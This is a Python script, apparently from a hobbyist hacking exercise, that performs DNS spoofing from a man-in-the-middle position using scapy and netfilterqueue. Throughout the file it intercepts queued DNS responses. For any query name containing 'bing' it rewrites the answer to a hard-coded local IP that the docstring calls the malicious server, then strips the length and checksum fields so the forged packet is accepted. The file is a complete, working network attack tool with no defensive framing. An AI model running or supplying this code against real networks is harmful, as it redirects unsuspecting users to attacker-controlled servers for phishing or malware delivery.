#!user/bin/env python

r""" >>>  python dns_spoofer.py -n 'NetFilter Queue Number'  <<<
     This script spoofes the original IP of the website that is sent back by the DNS server to the spoofed IP address of the server that we want. It keeps tracks of the DNSQR (DNS Querry Record) and modifies the  DNSRR (DNS Respond Record) of the packet to redirect the target machine to the spoofed server.
     It accepts one command line argument >>>
     * -n or --qnum : NetFilter Queue Number

     The script imports the following packages >>>
     * argparse       : It gets the command line arguments and parse their values. (an updated version of this package - "argparse" is included in python3)
     * scapy.all      : It manipulates the data packets.
     * netfilterqueue : It provides access to the packets that are stored in the queue. There are 3 types of queue - INPUT , OUTPUT and FORWARD.

"""

import netfilterqueue
import argparse
import scapy.all as scapy


def get_cmd_args():
    r""" This function gets the command line arguments and returns them as key and values.
         The two keys are >>>
         - [variable_name].num : It contains the queue number in which the packets are stored.
      :return: A variable containing key - netfilter queue number.
      """
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--num",dest="num",help="Queue number")
    # parser.add_argument("-h","--host",dest="host",help="Spoofed host address")
    options = parser.parse_args()
    if not options.num :
        parser.error("[-] Please specify a queue no.")
    # elif not options.host:
    #     parser.error("[-] Please specify the address of spoofed host")
    return options


def modify_packet_security(packet):
    r""" This method deletes the length and checksum from the IP and UDP layer. Scapy recalculates the new length and checksum based on the modified packet on its own. A mismatch in the length and checksum will lead to rejection of the packet by the target machine.
    :param packet: Data packet whose IP and UDP layer has to be modified
    :return: Modified data packet
    """
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP].len
    return packet


def process_packet(packet):
    r""" It process the packet passed in the argument. It modifies the DNSRR (DNS Respond Record) of the packet and changes the rdata which is the IP address of the original server to the malicious server.
         It call backs another method >>>
         - modify_packet_security(packet) : It modifies the data in the IP and the UDP layer of the packet.
    :param packet : Data packet flowing through the MITM machine.
    :return : NONE
    """
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "bing" in qname:
            print("[+] Spoofing target DNS ")
            answer = scapy.DNSRR(rrname=qname,rdata="192.168.43.138")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet = modify_packet_security(scapy_packet)
            packet.set_payload(str(scapy_packet))
    packet.accept()


options = get_cmd_args()
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.num),process_packet)
queue.run()

